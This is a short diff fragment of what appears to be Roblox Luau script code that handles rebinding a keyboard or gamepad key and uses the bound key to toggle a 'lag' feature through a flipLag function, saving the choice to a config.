+        if kc == Enum.KeyCode.Escape then listeningFor = nil; updateKbLabels(); return end
+        if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
+            cfg.keybindKb = kc.Name; listeningFor = nil; updateKbLabels(); saveConfig(); return
+        end
+        if listeningFor == "gp" and isGp then
+            cfg.keybindGp = kc.Name; listeningFor = nil; updateKbLabels(); saveConfig(); return
+        end
+        return
+    end
+    if processed then return end
+
+    local kbEnum = resolveKb(cfg.keybindKb)
+    local gpEnum = resolveKb(cfg.keybindGp)
+    if (kbEnum and kc == kbEnum and isKb) or (gpEnum and kc == gpEnum and isGp) then
+        flipLag(not active)
+    end
+end)
+
+updateLevelDisplay()
+updateKbLabels()
